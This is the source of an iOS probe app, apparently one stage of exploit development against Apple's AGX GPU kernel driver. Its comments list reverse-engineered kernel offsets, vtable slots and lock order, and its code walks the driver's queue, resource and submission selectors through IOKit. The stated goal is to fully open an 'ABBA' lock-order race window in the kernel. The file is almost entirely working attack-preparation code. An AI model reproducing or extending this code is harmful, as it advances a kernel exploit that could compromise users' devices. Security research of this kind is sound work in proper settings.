//
//  abba_probe2.m — IOGPU ABBA 第二阶段：把队列/资源/提交流程走通
//
//  v1 (iogpu_probe) 已确认（真机 2026-11-22）：
//    · IORegistry 里没有 IOGPUDevice，只有 AGXAcceleratorG13P_B0
//    · open type=1 成功；sel 0..31 全部 BadArgument（=都存在）
//    · sel 7 (s_new_command_queue) 零输入成功 → queue id = 1
//    · sel 26 stride 必须精确等于 [queue->0x530]->0x268 = 0x38；count=0 时返回 0xe00002bc
//      （= 已完整走完 458→528 锁序，只因 queue->0x428 == 0 提前收尾）
//    · sel 9 零输入 = NoResources（可达，非门控）
//
//  离线新增（本轮）：
//    · queue init = 0x9c1d6c0（vtable 0x7dc5d68 槽 +0xd8, disc 0xfcfc）
//      structIn 前 0x400 字节 memcpy 到 queue+0x10；structIn+0x400=count(<=4)；+0x404=bool
//      queue+0x488 = device（sel7 时已设）；queue+0x428 = 0（需要 setNotificationQueue）
//    · sel 25 = IOGPUCommandQueue::setNotificationQueue(queue_id, notif_queue_id)，cin=2
//    · queue+0x428 = 0x9bfa5bc(notif_queue)；非零后 sel26 才进真实提交路径
//
//  本包目标：建出 notification queue / resource，让 sel26 走完整提交
//

#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <unistd.h>

// ---- IOSurface 手动声明（theos SDK 只有 .tbd，无头文件） ----
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern uint32_t    IOSurfaceGetID(IOSurfaceRef buffer);
extern kern_return_t IOSurfaceLock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);
extern void       *IOSurfaceGetBaseAddress(IOSurfaceRef buffer);
extern size_t      IOSurfaceGetAllocSize(IOSurfaceRef buffer);

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static const char *kr_name(kern_return_t kr)
{
    switch ((uint32_t)kr) {
        case 0:          return "SUCCESS";
        case 0xe00002bc: return "Error";
        case 0xe00002be: return "NoResources";
        case 0xe00002c2: return "BadArgument";
        case 0xe00002c7: return "Unsupported";
        case 0xe00002c9: return "InternalError";
        case 0xe00002cc: return "NotOpen";
        case 0xe00002e2: return "NotPermitted";
        default:         return "?";
    }
}

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[abba2] %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    if (!docs) docs = NSTemporaryDirectory();
    FILE *f = fopen([[docs stringByAppendingPathComponent:@"abba_probe2.log"] UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_async(gQ, ^{
        [gLog appendString:line];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
        });
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) { gStatus.text = s; gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold]; }
    });
}

static io_connect_t g_conn = MACH_PORT_NULL;
static uint32_t g_qid = 0;
static uint32_t g_notif = 0;
static uint32_t g_res = 0;
static uint32_t g_surfID = 0;

// ---------------------------------------------------------------- open

static void do_open(void)
{
    L(@"");
    L(@"========== A: open AGXAcceleratorG13P_B0 (type=1) ==========");
    CFMutableDictionaryRef m = IOServiceMatching("AGXAcceleratorG13P_B0");
    io_service_t svc = m ? IOServiceGetMatchingService(kIOMainPortDefault, m) : MACH_PORT_NULL;
    if (!svc) { L(@"   未匹配"); return; }
    for (uint32_t t = 0; t <= 3 && g_conn == MACH_PORT_NULL; t++) {
        io_connect_t c = MACH_PORT_NULL;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), t, &c);
        L(@"   type=%u -> 0x%08x %-14s conn=0x%x", t, (uint32_t)kr, kr_name(kr), c);
        if (kr == KERN_SUCCESS) g_conn = c;
    }
    IOObjectRelease(svc);
}

// ---------------------------------------------------------------- sel7 queue

static void do_new_queue(void)
{
    L(@"");
    L(@"========== B: sel 7 s_new_command_queue ==========");
    size_t sz = 1032;
    uint8_t *in = calloc(sz, 1);
    if (!in) return;
    // 试两档：全零 vs 把 +0x400(count)=1 填上
    for (int v = 0; v < 2; v++) {
        memset(in, 0, sz);
        if (v == 1) *(uint32_t *)(in + 0x400) = 1;
        uint8_t out[16]; memset(out, 0, sizeof(out));
        size_t os = sizeof(out);
        kern_return_t r = IOConnectCallStructMethod(g_conn, 7, in, sz, out, &os);
        uint32_t id = *(uint32_t *)out;
        L(@"   [%d] sel7 count=%u -> 0x%08x %-12s outSize=0x%zx id=%u v2=0x%llx",
          v, (v ? 1u : 0u), (uint32_t)r, kr_name(r), os, id, (unsigned long long)*(uint64_t *)(out + 8));
        if (r == KERN_SUCCESS && id != 0 && g_qid == 0) g_qid = id;
    }
    free(in);
    L(@"   queue id = %u", g_qid);
}

// ---------------------------------------------------------------- notification queue 探测

// 扫 sel 0..31：用 "2 个 scalar + 16B structIn + 0x200 structOut" 找能建出 notif queue 的
static void do_probe_notif(void)
{
    L(@"");
    L(@"========== C: 扫 sel 0..31 找 create_notificationqueue ==========");
    uint8_t in16[16]; memset(in16, 0, sizeof(in16));
    for (uint32_t sel = 0; sel <= 31; sel++) {
        uint64_t sc[2] = { g_qid, 0 };
        uint8_t out[0x200]; memset(out, 0, sizeof(out));
        size_t os = sizeof(out);
        kern_return_t r = IOConnectCallMethod(g_conn, sel, sc, 2, in16, sizeof(in16), NULL, NULL, out, &os);
        // 只报"不是 BadArgument/Unsupported"的
        if ((uint32_t)r != 0xe00002c2 && (uint32_t)r != 0xe00002c7) {
            L(@"   sel%-2u scalars{qid,0} in16 -> 0x%08x %-14s outSize=0x%zx out=%02x%02x%02x%02x",
              sel, (uint32_t)r, kr_name(r), os, out[0], out[1], out[2], out[3]);
            if ((uint32_t)r == 0 && g_notif == 0) {
                uint32_t cand = *(uint32_t *)out;
                if (cand) { g_notif = cand; L(@"      ★ 疑似 notif queue id=%u (sel %u)", cand, sel); }
            }
        }
    }
    if (!g_notif) L(@"   本轮没扫出来（可能需要别的输入尺寸/标量）");
}

// ---------------------------------------------------------------- sel25 setNotificationQueue

static void do_set_notif(void)
{
    L(@"");
    L(@"========== D: sel 25 setNotificationQueue(qid, notif) ==========");
    if (!g_notif) { L(@"   没有 notif queue id，跳过"); return; }
    uint64_t sc[2] = { g_qid, g_notif };
    uint64_t out[4]; memset(out, 0, sizeof(out));
    uint32_t oc = 4;
    kern_return_t r = IOConnectCallScalarMethod(g_conn, 25, sc, 2, out, &oc);
    L(@"   sel25(%u,%u) -> 0x%08x %s", g_qid, g_notif, (uint32_t)r, kr_name(r));
}

// ---------------------------------------------------------------- IOSurface + sel9 resource

static void do_make_surface(void)
{
    L(@"");
    L(@"========== E: 建 IOSurface（给 resType=0x82 用） ==========");
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFStringRef k;
    int32_t w = 256, h = 256, bpe = 4, pf = 0x42475241; /* 'BGRA' */
    int32_t alloc = 0x40000;
    CFNumberRef n;
    k = CFSTR("IOSurfaceWidth");          n = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);     CFDictionarySetValue(d, k, n); CFRelease(n);
    k = CFSTR("IOSurfaceHeight");         n = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);     CFDictionarySetValue(d, k, n); CFRelease(n);
    k = CFSTR("IOSurfaceBytesPerElement");n = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);   CFDictionarySetValue(d, k, n); CFRelease(n);
    k = CFSTR("IOSurfacePixelFormat");    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);    CFDictionarySetValue(d, k, n); CFRelease(n);
    k = CFSTR("IOSurfaceAllocSize");      n = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc); CFDictionarySetValue(d, k, n); CFRelease(n);

    IOSurfaceRef s = IOSurfaceCreate(d);
    CFRelease(d);
    if (!s) { L(@"   IOSurfaceCreate 失败"); return; }
    g_surfID = IOSurfaceGetID(s);
    size_t asz = IOSurfaceGetAllocSize(s);
    void *base = IOSurfaceGetBaseAddress(s);
    L(@"   surface id=%u allocSize=0x%zx base=%p", g_surfID, asz, base);

    // 往 surface 里写一条 type=3 kernel command（24 字节），供后续验证
    uint32_t seed = 0;
    if (IOSurfaceLock(s, 0, &seed) == KERN_SUCCESS) {
        uint8_t *p = (uint8_t *)IOSurfaceGetBaseAddress(s);
        if (p && asz >= 0x40) {
            memset(p, 0, 0x40);
            *(uint32_t *)(p + 0x00) = 3;      // type
            *(uint32_t *)(p + 0x04) = 0x18;   // size
            *(uint32_t *)(p + 0x08) = 1;      // id ∈ [1,4]
            L(@"   已写入 type=3 命令（+0=3 +4=0x18 +8=1）");
        }
        IOSurfaceUnlock(s, 0, &seed);
    }
}

static void do_new_resource(void)
{
    L(@"");
    L(@"========== F: sel 9 new_resource，扫 resType ==========");
    uint32_t types[] = { 0x82, 0x00, 0x03, 0x80 };
    for (int i = 0; i < 4; i++) {
        uint32_t rt = types[i];
        uint8_t in[0x58]; memset(in, 0, sizeof(in));
        *(uint32_t *)(in + 0x00) = rt;
        if (rt == 0x82) {
            if (!g_surfID) { L(@"   resType=0x82 无 surface，跳过"); continue; }
            *(uint32_t *)(in + 0x38) = g_surfID;   // IOSurface id
            *(uint32_t *)(in + 0x3c) = 0;
            *(uint32_t *)(in + 0x40) = 0;
        } else if (rt == 0x80) {
            // 需要一个 address-range 描述符（K7 未解），先给非零占位
            *(uint64_t *)(in + 0x18) = 0x1000;
            *(uint64_t *)(in + 0x38) = 1;
            *(uint64_t *)(in + 0x40) = 1;
            *(uint64_t *)(in + 0x48) = 1;
            *(uint64_t *)(in + 0x50) = 0x1000;
        } else {
            *(uint64_t *)(in + 0x38) = 0x1000;     // size
            *(uint64_t *)(in + 0x40) = 0x1000;
        }
        uint8_t out[0x400]; memset(out, 0, sizeof(out));
        size_t os = sizeof(out);
        kern_return_t r = IOConnectCallStructMethod(g_conn, 9, in, sizeof(in), out, &os);
        L(@"   resType=0x%02x -> 0x%08x %-14s outSize=0x%zx out+0=%08x out+8=%08x",
          rt, (uint32_t)r, kr_name(r), os,
          *(uint32_t *)(out), *(uint32_t *)(out + 8));
        if (r == KERN_SUCCESS && g_res == 0) {
            uint32_t cand = *(uint32_t *)(out + 8);
            if (!cand) cand = *(uint32_t *)(out);
            if (cand) { g_res = cand; L(@"      ★ resource 候选 id=%u（resType=0x%02x）", cand, rt); }
        }
    }
}

// ---------------------------------------------------------------- sel26 提交（含 count=1）

static void do_submit(void)
{
    L(@"");
    L(@"========== G: sel 26 submit（stride=0x38 已由 v1 实测） ==========");
    uint32_t stride = 0x38;
    // count=0 复测
    {
        uint64_t sc[4] = { g_qid, 0, 0, stride };
        size_t os = 0;
        kern_return_t r = IOConnectCallMethod(g_conn, 26, sc, 4, NULL, 0, NULL, NULL, NULL, &os);
        L(@"   count=0 -> 0x%08x %s", (uint32_t)r, kr_name(r));
    }
    // count=1（描述符 +0x20 = resource id）
    if (!g_res) { L(@"   没有 resource id，count=1 跳过（会因 +0x20=0 失败）"); return; }
    uint8_t desc[0x38]; memset(desc, 0, sizeof(desc));
    *(uint32_t *)(desc + 0x20) = g_res;
    uint64_t sc[4] = { g_qid, 0, 1, stride };
    size_t os = 0;
    kern_return_t r = IOConnectCallMethod(g_conn, 26, sc, 4, desc, sizeof(desc), NULL, NULL, NULL, &os);
    L(@"   count=1 res=%u -> 0x%08x %s", g_res, (uint32_t)r, kr_name(r));
}

static void run(void)
{
    L(@"===== ABBA probe2 @ %@ =====", [NSDate date]);
    L(@"uid=%d pid=%d", getuid(), getpid());
    do_open();
    if (g_conn == MACH_PORT_NULL) { L(@"open 失败，终止"); return; }
    do_new_queue();
    do_probe_notif();
    do_set_notif();
    do_make_surface();
    do_new_resource();
    do_submit();
    L(@"");
    L(@"===== 判读 =====");
    L(@"  · F 出 resource id => 命令载体打通，下一步填 {begin,end} 表");
    L(@"  · G count=1 若不是 BadArgument => 已进真实提交流程（ABBA 窗口全开）");
    SetStatus(@"done");
    if (g_conn) { IOServiceClose(g_conn); g_conn = MACH_PORT_NULL; }
    L(@"===== done =====");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("abba2.log", DISPATCH_QUEUE_SERIAL);
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];
    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 30)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"abba probe2...";
    gStatus.textColor = [UIColor colorWithRed:0.3 green:1 blue:0.3 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];
    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 84, self.window.bounds.size.width, h - 84)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:7] ?: [UIFont systemFontOfSize:7];
    gView.editable = NO;
    [vc.view addSubview:gView];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
